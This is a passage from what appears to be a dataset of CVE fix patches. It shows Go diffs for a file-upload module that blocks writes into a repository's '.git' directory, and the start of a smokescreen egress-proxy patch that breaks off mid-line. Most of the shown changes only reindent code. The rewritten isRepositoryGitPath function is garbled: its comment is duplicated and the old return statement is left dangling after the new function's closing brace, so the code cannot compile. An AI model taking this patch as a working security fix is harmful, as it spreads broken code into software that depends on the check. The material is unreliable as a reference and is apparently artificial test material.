%v\", err)\n-\t}\n-\n-\tfw, err := os.Create(localPath)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"create: %v\", err)\n-\t}\n-\tdefer fw.Close()\n-\n-\tif _, err = fw.Write(buf); err != nil {\n-\t\treturn nil, fmt.Errorf(\"write: %v\", err)\n-\t} else if _, err = io.Copy(fw, file); err != nil {\n-\t\treturn nil, fmt.Errorf(\"copy: %v\", err)\n-\t}\n-\n-\tif _, err := x.Insert(upload); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\treturn upload, nil\n+        if tool.IsMaliciousPath(name) {\n+                return nil, fmt.Errorf(\"malicious path detected: %s\", name)\n+        }\n+\n+        upload := &Upload{\n+                UUID: gouuid.NewV4().String(),\n+                Name: name,\n+        }\n+\n+        localPath := upload.LocalPath()\n+        if err = os.MkdirAll(path.Dir(localPath), os.ModePerm); err != nil {\n+                return nil, fmt.Errorf(\"mkdir all: %v\", err)\n+        }\n+\n+        fw, err := os.Create(localPath)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"create: %v\", err)\n+        }\n+        defer fw.Close()\n+\n+        if _, err = fw.Write(buf); err != nil {\n+                return nil, fmt.Errorf(\"write: %v\", err)\n+        } else if _, err = io.Copy(fw, file); err != nil {\n+                return nil, fmt.Errorf(\"copy: %v\", err)\n+        }\n+\n+        if _, err := x.Insert(upload); err != nil {\n+                return nil, err\n+        }\n+\n+        return upload, nil\n }\n \n func GetUploadByUUID(uuid string) (*Upload, error) {\n-\tupload := &Upload{UUID: uuid}\n-\thas, err := x.Get(upload)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t} else if !has {\n-\t\treturn nil, ErrUploadNotExist{0, uuid}\n-\t}\n-\treturn upload, nil\n+        upload := &Upload{UUID: uuid}\n+        has, err := x.Get(upload)\n+        if err != nil {\n+                return nil, err\n+        } else if !has {\n+                return nil, ErrUploadNotExist{0, uuid}\n+        }\n+        return upload, nil\n }\n \n func GetUploadsByUUIDs(uuids []string) ([]*Upload, error) {\n-\tif len(uuids) == 0 {\n-\t\treturn []*Upload{}, nil\n-\t}\n+        if len(uuids) == 0 {\n+                return []*Upload{}, nil\n+        }\n \n-\t// Silently drop invalid uuids.\n-\tuploads := make([]*Upload, 0, len(uuids))\n-\treturn uploads, x.In(\"uuid\", uuids).Find(&uploads)\n+        // Silently drop invalid uuids.\n+        uploads := make([]*Upload, 0, len(uuids))\n+        return uploads, x.In(\"uuid\", uuids).Find(&uploads)\n }\n \n func DeleteUploads(uploads ...*Upload) (err error) {\n-\tif len(uploads) == 0 {\n-\t\treturn nil\n-\t}\n-\n-\tsess := x.NewSession()\n-\tdefer sess.Close()\n-\tif err = sess.Begin(); err != nil {\n-\t\treturn err\n-\t}\n-\n-\tids := make([]int64, len(uploads))\n-\tfor i := 0; i < len(uploads); i++ {\n-\t\tids[i] = uploads[i].ID\n-\t}\n-\tif _, err = sess.In(\"id\", ids).Delete(new(Upload)); err != nil {\n-\t\treturn fmt.Errorf(\"delete uploads: %v\", err)\n-\t}\n-\n-\tfor _, upload := range uploads {\n-\t\tlocalPath := upload.LocalPath()\n-\t\tif !osutil.IsFile(localPath) {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tif err := os.Remove(localPath); err != nil {\n-\t\t\treturn fmt.Errorf(\"remove upload: %v\", err)\n-\t\t}\n-\t}\n-\n-\treturn sess.Commit()\n+        if len(uploads) == 0 {\n+                return nil\n+        }\n+\n+        sess := x.NewSession()\n+        defer sess.Close()\n+        if err = sess.Begin(); err != nil {\n+                return err\n+        }\n+\n+        ids := make([]int64, len(uploads))\n+        for i := 0; i < len(uploads); i++ {\n+                ids[i] = uploads[i].ID\n+        }\n+        if _, err = sess.In(\"id\", ids).Delete(new(Upload)); err != nil {\n+                return fmt.Errorf(\"delete uploads: %v\", err)\n+        }\n+\n+        for _, upload := range uploads {\n+                localPath := upload.LocalPath()\n+                if !osutil.IsFile(localPath) {\n+                        continue\n+                }\n+\n+                if err := os.Remove(localPath); err != nil {\n+                        return fmt.Errorf(\"remove upload: %v\", err)\n+                }\n+        }\n+\n+        return sess.Commit()\n }\n \n func DeleteUpload(u *Upload) error {\n-\treturn DeleteUploads(u)\n+        return DeleteUploads(u)\n }\n \n func DeleteUploadByUUID(uuid string) error {\n-\tupload, err := GetUploadByUUID(uuid)\n-\tif err != nil {\n-\t\tif IsErrUploadNotExist(err) {\n-\t\t\treturn nil\n-\t\t}\n-\t\treturn fmt.Errorf(\"get upload by UUID[%s]: %v\", uuid, err)\n-\t}\n-\n-\tif err := DeleteUpload(upload); err != nil {\n-\t\treturn fmt.Errorf(\"delete upload: %v\", err)\n-\t}\n-\n-\treturn nil\n+        upload, err := GetUploadByUUID(uuid)\n+        if err != nil {\n+                if IsErrUploadNotExist(err) {\n+                        return nil\n+                }\n+                return fmt.Errorf(\"get upload by UUID[%s]: %v\", uuid, err)\n+        }\n+\n+        if err := DeleteUpload(upload); err != nil {\n+                return fmt.Errorf(\"delete upload: %v\", err)\n+        }\n+\n+        return nil\n }\n \n type UploadRepoFileOptions struct {\n-\tLastCommitID string\n-\tOldBranch    string\n-\tNewBranch    string\n-\tTreePath     string\n-\tMessage      string\n-\tFiles        []string // In UUID format\n+        LastCommitID string\n+        OldBranch    string\n+        NewBranch    string\n+        TreePath     string\n+        Message      string\n+        Files        []string // In UUID format\n }\n \n+// isRepositoryGitPath returns true if given path is or resides inside \".git\"\n+// path of the repository.\n // isRepositoryGitPath returns true if given path is or resides inside \".git\"\n // path of the repository.\n func isRepositoryGitPath(path string) bool {\n-\treturn strings.HasSuffix(path, \".git\") ||\n-\t\tstrings.Contains(path, \".git\"+string(os.PathSeparator)) ||\n-\t\t// Windows treats \".git.\" the same as \".git\"\n-\t\tstrings.HasSuffix(path, \".git.\") ||\n-\t\tstrings.Contains(path, \".git.\"+string(os.PathSeparator))\n+path = strings.ReplaceAll(path, \"\\\\\", \"/\")\n+if runtime.GOOS == \"windows\" {\n+return strings.EqualFold(path, \".git\") ||\n+strings.HasSuffix(path, \"/.git\") ||\n+strings.Contains(path, \"/.git/\") ||\n+strings.EqualFold(path, \".git.\") ||\n+strings.HasSuffix(path, \"/.git.\") ||\n+strings.Contains(path, \"/.git./\")\n+}\n+return path == \".git\" ||\n+strings.HasSuffix(path, \"/.git\") ||\n+strings.Contains(path, \"/.git/\")\n+}\n+        return strings.HasSuffix(path, \".git\") ||\n+                strings.Contains(path, \".git\"+string(os.PathSeparator)) ||\n+                // Windows treats \".git.\" the same as \".git\"\n+                strings.HasSuffix(path, \".git.\") ||\n+                strings.Contains(path, \".git.\"+string(os.PathSeparator))\n }\n \n func (repo *Repository) UploadRepoFiles(doer *User, opts UploadRepoFileOptions) error {\n-\tif len(opts.Files) == 0 {\n-\t\treturn nil\n-\t}\n-\n-\t// \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n-\tif isRepositoryGitPath(opts.TreePath) {\n-\t\treturn errors.Errorf(\"bad tree path %q\", opts.TreePath)\n-\t}\n-\n-\tuploads, err := GetUploadsByUUIDs(opts.Files)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"get uploads by UUIDs[%v]: %v\", opts.Files, err)\n-\t}\n-\n-\trepoWorkingPool.CheckIn(com.ToStr(repo.ID))\n-\tdefer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n-\n-\tif err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n-\t} else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n-\t\treturn fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n-\t}\n-\n-\tif opts.OldBranch != opts.NewBranch {\n-\t\tif err = repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n-\t\t\treturn fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n-\t\t}\n-\t}\n-\n-\tlocalPath := repo.LocalCopyPath()\n-\tdirPath := path.Join(localPath, opts.TreePath)\n-\tif err = os.MkdirAll(dirPath, os.ModePerm); err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Copy uploaded files into repository\n-\tfor _, upload := range uploads {\n-\t\ttmpPath := upload.LocalPath()\n-\t\tif !osutil.IsFile(tmpPath) {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tupload.Name = pathutil.Clean(upload.Name)\n-\n-\t\t// \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n-\t\tif isRepositoryGitPath(upload.Name) {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\ttargetPath := path.Join(dirPath, upload.Name)\n-\t\tif err = com.Copy(tmpPath, targetPath); err != nil {\n-\t\t\treturn fmt.Errorf(\"copy: %v\", err)\n-\t\t}\n-\t}\n-\n-\tif err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n-\t\treturn fmt.Errorf(\"git add --all: %v\", err)\n-\t} else if err = git.CreateCommit(localPath, doer.NewGitSig(), opts.Message); err != nil {\n-\t\treturn fmt.Errorf(\"commit changes on %q: %v\", localPath, err)\n-\t}\n-\n-\terr = git.Push(localPath, \"origin\", opts.NewBranch,\n-\t\tgit.PushOptions{\n-\t\t\tCommandOptions: git.CommandOptions{\n-\t\t\t\tEnvs: ComposeHookEnvs(ComposeHookEnvsOptions{\n-\t\t\t\t\tAuthUser:  doer,\n-\t\t\t\t\tOwnerName: repo.MustOwner().Name,\n-\t\t\t\t\tOwnerSalt: repo.MustOwner().Salt,\n-\t\t\t\t\tRepoID:    repo.ID,\n-\t\t\t\t\tRepoName:  repo.Name,\n-\t\t\t\t\tRepoPath:  repo.RepoPath(),\n-\t\t\t\t}),\n-\t\t\t},\n-\t\t},\n-\t)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n-\t}\n-\n-\treturn DeleteUploads(uploads...)\n+        if len(opts.Files) == 0 {\n+                return nil\n+        }\n+\n+        // \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n+        if isRepositoryGitPath(opts.TreePath) {\n+                return errors.Errorf(\"bad tree path %q\", opts.TreePath)\n+        }\n+\n+        uploads, err := GetUploadsByUUIDs(opts.Files)\n+        if err != nil {\n+                return fmt.Errorf(\"get uploads by UUIDs[%v]: %v\", opts.Files, err)\n+        }\n+\n+        repoWorkingPool.CheckIn(com.ToStr(repo.ID))\n+        defer repoWorkingPool.CheckOut(com.ToStr(repo.ID))\n+\n+        if err = repo.DiscardLocalRepoBranchChanges(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"discard local repo branch[%s] changes: %v\", opts.OldBranch, err)\n+        } else if err = repo.UpdateLocalCopyBranch(opts.OldBranch); err != nil {\n+                return fmt.Errorf(\"update local copy branch[%s]: %v\", opts.OldBranch, err)\n+        }\n+\n+        if opts.OldBranch != opts.NewBranch {\n+                if err = repo.CheckoutNewBranch(opts.OldBranch, opts.NewBranch); err != nil {\n+                        return fmt.Errorf(\"checkout new branch[%s] from old branch[%s]: %v\", opts.NewBranch, opts.OldBranch, err)\n+                }\n+        }\n+\n+        localPath := repo.LocalCopyPath()\n+        dirPath := path.Join(localPath, opts.TreePath)\n+        if err = os.MkdirAll(dirPath, os.ModePerm); err != nil {\n+                return err\n+        }\n+\n+        // Copy uploaded files into repository\n+        for _, upload := range uploads {\n+                tmpPath := upload.LocalPath()\n+                if !osutil.IsFile(tmpPath) {\n+                        continue\n+                }\n+\n+                upload.Name = pathutil.Clean(upload.Name)\n+\n+                // \ud83d\udea8 SECURITY: Prevent uploading files into the \".git\" directory\n+                if isRepositoryGitPath(upload.Name) {\n+                        continue\n+                }\n+\n+                targetPath := path.Join(dirPath, upload.Name)\n+                if err = com.Copy(tmpPath, targetPath); err != nil {\n+                        return fmt.Errorf(\"copy: %v\", err)\n+                }\n+        }\n+\n+        if err = git.Add(localPath, git.AddOptions{All: true}); err != nil {\n+                return fmt.Errorf(\"git add --all: %v\", err)\n+        } else if err = git.CreateCommit(localPath, doer.NewGitSig(), opts.Message); err != nil {\n+                return fmt.Errorf(\"commit changes on %q: %v\", localPath, err)\n+        }\n+\n+        err = git.Push(localPath, \"origin\", opts.NewBranch,\n+                git.PushOptions{\n+                        CommandOptions: git.CommandOptions{\n+                                Envs: ComposeHookEnvs(ComposeHookEnvsOptions{\n+                                        AuthUser:  doer,\n+                                        OwnerName: repo.MustOwner().Name,\n+                                        OwnerSalt: repo.MustOwner().Salt,\n+                                        RepoID:    repo.ID,\n+                                        RepoName:  repo.Name,\n+                                        RepoPath:  repo.RepoPath(),\n+                                }),\n+                        },\n+                },\n+        )\n+        if err != nil {\n+                return fmt.Errorf(\"git push origin %s: %v\", opts.NewBranch, err)\n+        }\n+\n+        return DeleteUploads(uploads...)\n }\n"}
{"cve":"CVE-2022-29188:0708", "fix_patch": "diff --git a/pkg/smokescreen/smokescreen.go b/pkg/smokescreen/smokescreen.go\nindex f188768..ba6b6e5 100644\n--- a/pkg/smokescreen/smokescreen.go\n+++ b/pkg/smokescreen/smokescreen.go\n@@ -1,147 +1,147 @@\n package smokescreen\n \n import (\n-\t\"context\"\n-\t\"crypto/tls\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"os\"\n-\t\"os/signal\"\n-\t\"strings\"\n-\t\"syscall\"\n-\t\"time\"\n-\n-\tproxyproto \"github.com/armon/go-proxyproto\"\n-\t\"github.com/rs/xid\"\n-\t\"github.com/sirupsen/logrus\"\n-\t\"github.com/stripe/goproxy\"\n-\t\"github.com/stripe/smokescreen/internal/einhorn\"\n-\tacl \"github.com/stripe/smokescreen/pkg/smokescreen/acl/v1\"\n-\t\"github.com/stripe/smokescreen/pkg/smokescreen/conntrack\"\n+        \"context\"\n+        \"crypto/tls\"\n+        \"errors\"\n+        \"fmt\"\n+        \"io\"\n+        \"net\"\n+        \"net/http\"\n+        \"os\"\n+        \"os/signal\"\n+        \"strings\"\n+        \"syscall\"\n+        \"time\"\n+\n+        proxyproto \"github.com/armon/go-proxyproto\"\n+        \"github.com/rs/xid\"\n+        \"github.com/sirupsen/logrus\"\n+        \"github.com/stripe/goproxy\"\n+        \"github.com/stripe/smokescreen/internal/einhorn\"\n+        acl \"github.com/stripe/smokescreen/pkg/smokescreen/acl/v1\"\n+        \"github.com/stripe/smokescreen/pkg/smokescreen/conntrack\"\n )\n \n const (\n-\tipAllowDefault ipType = iota\n-\tipAllowUserConfigured\n-\tipDenyNotGlobalUnicast\n-\tipDenyPrivateRange\n-\tipDenyUserConfigured\n+        ipAllowDefault ipType = iota\n+        ipAllowUserConfigured\n+        ipDenyNotGlobalUnicast\n+        ipDenyPrivateRange\n+        ipDenyUserConfigured\n \n-\tdenyMsgTmpl = \"Egress proxying is denied to host '%s': %s.\"\n+        denyMsgTmpl = \"Egress proxying is denied to host '%s': %s.\"\n \n-\thttpProxy    = \"http\"\n-\tconnectProxy = \"connect\"\n+        httpProxy    = \"http\"\n+        connectProxy = \"connect\"\n )\n \n const (\n-\tLogFieldID               = \"id\"\n-\tLogFieldOutLocalAddr     = \"outbound_local_addr\"\n-\tLogFieldOutRemoteAddr    = \"outbound_remote_addr\"\n-\tLogFieldInRemoteAddr     = \"inbound_remote_addr\"\n-\tLogFieldProxyType        = \"proxy_type\"\n-\tLogFieldRequestedHost    = \"requested_host\"\n-\tLogFieldStartTime        = \"start_time\"\n-\tLogFieldTraceID          = \"trace_id\"\n-\tLogFieldInRemoteX509CN   = \"inbound_remote_x509_cn\"\n-\tLogFieldInRemoteX509OU   = \"inbound_remote_x509_ou\"\n-\tLogFieldRole             = \"role\"\n-\tLogFieldProject          = \"project\"\n-\tLogFieldContentLength    = \"content_length\"\n-\tLogFieldDecisionReason   = \"decision_reason\"\n-\tLogFieldEnforceWouldDeny = \"enforce_would_deny\"\n-\tLogFieldAllow            = \"allow\"\n-\tLogFieldError            = \"error\"\n-\tCanonicalProxyDecision   = \"CANONICAL-PROXY-DECISION\"\n-\tLogFieldConnEstablishMS  = \"conn_establish_time_ms\"\n-\tLogFieldDNSLookupTime    = \"dns_lookup_time_ms\"\n+        LogFieldID               = \"id\"\n+        LogFieldOutLocalAddr     = \"outbound_local_addr\"\n+        LogFieldOutRemoteAddr    = \"outbound_remote_addr\"\n+        LogFieldInRemoteAddr     = \"inbound_remote_addr\"\n+        LogFieldProxyType        = \"proxy_type\"\n+        LogFieldRequestedHost    = \"requested_host\"\n+        LogFieldStartTime        = \"start_time\"\n+        LogFieldTraceID          = \"trace_id\"\n+        LogFieldInRemoteX509CN   = \"inbound_remote_x509_cn\"\n+        LogFieldInRemoteX509OU   = \"inbound_remote_x509_ou\"\n+        LogFieldRole             = \"role\"\n+        LogFieldProject          = \"project\"\n+        LogFieldContentLength    = \"content_length\"\n+        LogFieldDecisionReason   = \"decision_reason\"\n+        LogFieldEnforceWouldDeny = \"enforce_would_deny\"\n+        LogFieldAllow            = \"allow\"\n+        LogFieldError            = \"error\"\n+        CanonicalProxyDecision   = \"CANONICAL-PROXY-DECISION\"\n+        LogFieldConnEstablishMS  = \"conn_establish_time_ms\"\n+        LogFieldDNSLookupTime    = \"dns_lookup_time_ms\"\n )\n \n type ipType int\n \n type aclDecision struct {\n-\treason, role, project, outboundHost string\n-\tresolvedAddr                        *net.TCPAddr\n-\tallow                               bool\n-\tenforceWouldDeny                    bool\n+        reason, role, project, outboundHost string\n+        resolvedAddr                        *net.TCPAddr\n+        allow                               bool\n+        enforceWouldDeny                    bool\n }\n \n type smokescreenContext struct {\n-\tcfg           *Config\n-\tstart         time.Time\n-\tdecision      *aclDecision\n-\tproxyType     string\n-\tlogger        *logrus.Entry\n-\trequestedHost string\n-\n-\t// Time spent resolving the requested hostname\n-\tlookupTime time.Duration\n+        cfg           *Config\n+        start         time.Time\n+        decision      *aclDecision\n+        proxyType     string\n+        logger        *logrus.Entry\n+        requestedHost string\n+\n+        // Time spent resolving the requested hostname\n+        lookupTime time.Duration\n }\n \n // ExitStatus is used to log Smokescreen's connection status at shutdown time\n type ExitStatus int\n \n const (\n-\tClosed ExitStatus = iota\n-\tIdle\n-\tTimeout\n+        Closed ExitStatus = iota\n+        Idle\n+        Timeout\n )\n \n func (e ExitStatus) String() string {\n-\tswitch e {\n-\tcase Closed:\n-\t\treturn \"All connections closed\"\n-\tcase Idle:\n-\t\treturn \"All connections idle\"\n-\tcase Timeout:\n-\t\treturn \"Timed out waiting for connections to become idle\"\n-\tdefault:\n-\t\treturn \"Unknown exit status\"\n-\t}\n+        switch e {\n+        case Closed:\n+                return \"All connections closed\"\n+        case Idle:\n+                return \"All connections idle\"\n+        case Timeout:\n+                return \"Timed out waiting for connections to become idle\"\n+        default:\n+                return \"Unknown exit status\"\n+        }\n }\n \n type denyError struct {\n-\terror\n+        error\n }\n \n func (t ipType) IsAllowed() bool {\n-\treturn t == ipAllowDefault || t == ipAllowUserConfigured\n+        return t == ipAllowDefault || t == ipAllowUserConfigured\n }\n \n func (t ipType) String() string {\n-\tswitch t {\n-\tcase ipAllowDefault:\n-\t\treturn \"Allow: Default\"\n-\tcase ipAllowUserConfigured:\n-\t\treturn \"Allow: User Configured\"\n-\tcase ipDenyNotGlobalUnicast:\n-\t\treturn \"Deny: Not Global Unicast\"\n-\tcase ipDenyPrivateRange:\n-\t\treturn \"Deny: Private Range\"\n-\tcase ipDenyUserConfigured:\n-\t\treturn \"Deny: User Configured\"\n-\tdefault:\n-\t\tpanic(fmt.Errorf(\"unknown ip type %d\", t))\n-\t}\n+        switch t {\n+        case ipAllowDefault:\n+                return \"Allow: Default\"\n+        case ipAllowUserConfigured:\n+                return \"Allow: User Configured\"\n+        case ipDenyNotGlobalUnicast:\n+                return \"Deny: Not Global Unicast\"\n+        case ipDenyPrivateRange:\n+                return \"Deny: Private Range\"\n+        case ipDenyUserConfigured:\n+                return \"Deny: User Configured\"\n+        default:\n+                panic(fmt.Errorf(\"unknown ip type %d\", t))\n+        }\n }\n \n func (t ipType) statsdString() string {\n-\tswitch t {\n-\tcase ipAllowDefault:\n-\t\treturn \"resolver.allow.default\"\n-\tcase ipAllowUserConfigured:\n-\t\treturn \"resolver.allow.user_configured\"\n-\tcase ipDenyNotGlobalUnicast:\n-\t\treturn \"resolver.deny.not_global_unicast\"\n-\tcase ipDenyPrivateRange:\n-\t\treturn \"resolver.deny.private_range\"\n-\tcase ipDenyUserConfigured:\n-\t\treturn \"resolver.deny.user_configured\"\n-\tdefault:\n-\t\tpanic(fmt.Errorf(\"unknown ip type %d\", t))\n-\t}\n+        switch t {\n+        case ipAllowDefault:\n+                return \"resolver.allow.default\"\n+        case ipAllowUserConfigured:\n+                return \"resolver.allow.user_configured\"\n+        case ipDenyNotGlobalUnicast:\n+                return \"resolver.deny.not_global_unicast\"\n+        case ipDenyPrivateRange:\n+                return \"resolver.deny.private_range\"\n+        case ipDenyUserConfigured:\n+                return \"resolver.deny.user_configured\"\n+        default:\n+                panic(fmt.Errorf(\"unknown ip type %d\", t))\n+        }\n }\n \n const errorHeader = \"X-Smokescreen-Error\"\n@@ -149,650 +149,656 @@ const roleHeader = \"X-Smokescreen-Role\"\n const traceHeader = \"X-Smokescreen-Trace-ID\"\n \n func addrIsInRuleRange(ranges []RuleRange, addr *net.TCPAddr) bool {\n-\tfor _, rng := range ranges {\n-\t\t// If the range specifies a port and the port doesn't match,\n-\t\t// then this range doesn't match\n-\t\tif rng.Port != 0 && addr.Port != rng.Port {\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\tif rng.Net.Contains(addr.IP) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        for _, rng := range ranges {\n+                // If the range specifies a port and the port doesn't match,\n+                // then this range doesn't match\n+                if rng.Port != 0 && addr.Port != rng.Port {\n+                        continue\n+                }\n+\n+                if rng.Net.Contains(addr.IP) {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n func classifyAddr(config *Config, addr *net.TCPAddr) ipType {\n-\tif !addr.IP.IsGlobalUnicast() || addr.IP.IsLoopback() {\n-\t\tif addrIsInRuleRange(config.AllowRanges, addr) {\n-\t\t\treturn ipAllowUserConfigured\n-\t\t} else {\n-\t\t\treturn ipDenyNotGlobalUnicast\n-\t\t}\n-\t}\n-\n-\tif addrIsInRuleRange(config.AllowRanges, addr) {\n-\t\treturn ipAllowUserConfigured\n-\t} else if addrIsInRuleRange(config.DenyRanges, addr) {\n-\t\treturn ipDenyUserConfigured\n-\t} else if addrIsInRuleRange(PrivateRuleRanges, addr) && !config.UnsafeAllowPrivateRanges {\n-\t\treturn ipDenyPrivateRange\n-\t} else {\n-\t\treturn ipAllowDefault\n-\t}\n+        if !addr.IP.IsGlobalUnicast() || addr.IP.IsLoopback() {\n+                if addrIsInRuleRange(config.AllowRanges, addr) {\n+                        return ipAllowUserConfigured\n+                } else {\n+                        return ipDenyNotGlobalUnicast\n+                }\n+        }\n+\n+        if addrIsInRuleRange(config.AllowRanges, addr) {\n+                return ipAllowUserConfigured\n+        } else if addrIsInRuleRange(config.DenyRanges, addr) {\n+                return ipDenyUserConfigured\n+        } else if addrIsInRuleRange(PrivateRuleRanges, addr) && !config.UnsafeAllowPrivateRanges {\n+                return ipDenyPrivateRange\n+        } else {\n+                return ipAllowDefault\n+        }\n }\n \n func resolveTCPAddr(config *Config, network, addr string) (*net.TCPAddr, error) {\n-\tif network != \"tcp\" {\n-\t\treturn nil, fmt.Errorf(\"unknown network type %q\", network)\n-\t}\n-\thost, port, err := net.SplitHostPort(addr)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tctx := context.Background()\n-\tresolvedPort, err := config.Resolver.LookupPort(ctx, network, port)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tips, err := config.Resolver.LookupIP(ctx, config.Network, host)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif len(ips) < 1 {\n-\t\treturn nil, fmt.Errorf(\"no IPs resolved\")\n-\t}\n-\n-\treturn &net.TCPAddr{\n-\t\tIP:   ips[0],\n-\t\tPort: resolvedPort,\n-\t}, nil\n+        if network != \"tcp\" {\n+                return nil, fmt.Errorf(\"unknown network type %q\", network)\n+        }\n+        host, port, err := net.SplitHostPort(addr)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        ctx := context.Background()\n+        resolvedPort, err := config.Resolver.LookupPort(ctx, network, port)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        ips, err := config.Resolver.LookupIP(ctx, config.Network, host)\n+        if err != nil {\n+                return nil, err\n+        }\n+        if len(ips) < 1 {\n+                return nil, fmt.Errorf(\"no IPs resolved\")\n+        }\n+\n+        return &net.TCPAddr{\n+                IP:   ips[0],\n+                Port: resolvedPort,\n+        }, nil\n }\n \n func safeResolve(config *Config, network, addr string) (*net.TCPAddr, string, error) {\n-\tconfig.MetricsClient.Incr(\"resolver.attempts_total\", 1)\n-\tresolved, err := resolveTCPAddr(config, network, addr)\n-\tif err != nil {\n-\t\tconfig.MetricsClient.Incr(\"resolver.errors_total\", 1)\n-\t\treturn nil, \"\", err\n-\t}\n-\n-\tclassification := classifyAddr(config, resolved)\n-\tconfig.MetricsClient.Incr(classification.statsdString(), 1)\n-\n-\tif classification.IsAllowed() {\n-\t\treturn resolved, classification.String(), nil\n-\t}\n-\treturn nil, \"destination address was denied by rule, see error\", denyError{fmt.Errorf(\"The destination address (%s) was denied by rule '%s'\", resolved.IP, classification)}\n+        config.MetricsClient.Incr(\"resolver.attempts_total\", 1)\n+        resolved, err := resolveTCPAddr(config, network, addr)\n+        if err != nil {\n+                config.MetricsClient.Incr(\"resolver.errors_total\", 1)\n+                return nil, \"\", err\n+        }\n+\n+        classification := classifyAddr(config, resolved)\n+        config.MetricsClient.Incr(classification.statsdString(), 1)\n+\n+        if classification.IsAllowed() {\n+                return resolved, classification.String(), nil\n+        }\n+        return nil, \"destination address was denied by rule, see error\", denyError{fmt.Errorf(\"The destination address (%s) was denied by rule '%s'\", resolved.IP, classification)}\n }\n \n func proxyContext(ctx context.Context) (*goproxy.ProxyCtx, bool) {\n-\tpctx, ok := ctx.Value(goproxy.ProxyContextKey).(*goproxy.ProxyCtx)\n-\treturn pctx, ok\n+        pctx, ok := ctx.Value(goproxy.ProxyContextKey).(*goproxy.ProxyCtx)\n+        return pctx, ok\n }\n \n func dialContext(ctx context.Context, network, addr string) (net.Conn, error) {\n-\tpctx, ok := proxyContext(ctx)\n-\tif !ok {\n-\t\treturn nil, fmt.Errorf(\"dialContext missing required *goproxy.ProxyCtx\")\n-\t}\n-\n-\tsctx, ok := pctx.UserData.(*smokescreenContext)\n-\tif !ok {\n-\t\treturn nil, fmt.Errorf(\"dialContext missing required *smokescreenContext\")\n-\t}\n-\td := sctx.decision\n-\n-\t// If an address hasn't been resolved, does not match the original outboundHost,\n-\t// or is not tcp we must re-resolve it before establishing the connection.\n-\tif d.resolvedAddr == nil || d.outboundHost != addr || network != \"tcp\" {\n-\t\tvar err error\n-\t\td.resolvedAddr, d.reason, err = safeResolve(sctx.cfg, network, addr)\n-\t\tif err != nil {\n-\t\t\tif _, ok := err.(denyError); ok {\n-\t\t\t\tsctx.cfg.Log.WithFields(\n-\t\t\t\t\tlogrus.Fields{\n-\t\t\t\t\t\t\"address\": addr,\n-\t\t\t\t\t\t\"error\":   err,\n-\t\t\t\t\t}).Error(\"unexpected illegal address in dialer\")\n-\t\t\t}\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\tvar conn net.Conn\n-\tvar err error\n-\n-\tstart := time.Now()\n-\tif sctx.cfg.ProxyDialTimeout == nil {\n-\t\tconn, err = net.DialTimeout(network, d.resolvedAddr.String(), sctx.cfg.ConnectTimeout)\n-\t} else {\n-\t\tconn, err = sctx.cfg.ProxyDialTimeout(ctx, network, d.resolvedAddr.String(), sctx.cfg.ConnectTimeout)\n-\t}\n-\tconnTime := time.Since(start)\n-\n-\tfields := logrus.Fields{\n-\t\tLogFieldConnEstablishMS: connTime.Milliseconds(),\n-\t}\n-\n-\tif sctx.cfg.TimeConnect {\n-\t\tdomainTag := fmt.Sprintf(\"domain:%s\", sctx.requestedHost)\n-\t\tsctx.cfg.MetricsClient.TimingWithTags(\"cn.atpt.connect.time\", connTime, 1, []string{domainTag})\n-\t}\n-\n-\tif err != nil {\n-\t\tsctx.cfg.MetricsClient.IncrWithTags(\"cn.atpt.total\", []string{\"success:false\"}, 1)\n-\t\treturn nil, err\n-\t}\n-\tsctx.cfg.MetricsClient.IncrWithTags(\"cn.atpt.total\", []string{\"success:true\"}, 1)\n-\n-\tif conn != nil {\n-\t\tfields := logrus.Fields{}\n-\n-\t\tif addr := conn.LocalAddr(); addr != nil {\n-\t\t\tfields[LogFieldOutLocalAddr] = addr.String()\n-\t\t}\n-\n-\t\tif addr := conn.RemoteAddr(); addr != nil {\n-\t\t\tfields[LogFieldOutRemoteAddr] = addr.String()\n-\t\t}\n-\n-\t}\n-\tsctx.logger = sctx.logger.WithFields(fields)\n-\n-\t// Only wrap CONNECT conns with an InstrumentedConn. Connections used for traditional HTTP proxy\n-\t// requests are pooled and reused by net.Transport.\n-\tif sctx.proxyType == connectProxy {\n-\t\tic := sctx.cfg.ConnTracker.NewInstrumentedConnWithTimeout(conn, sctx.cfg.IdleTimeout, sctx.logger, d.role, d.outboundHost, sctx.proxyType)\n-\t\tpctx.ConnErrorHandler = ic.Error\n-\t\tconn = ic\n-\t} else {\n-\t\tconn = NewTimeoutConn(conn, 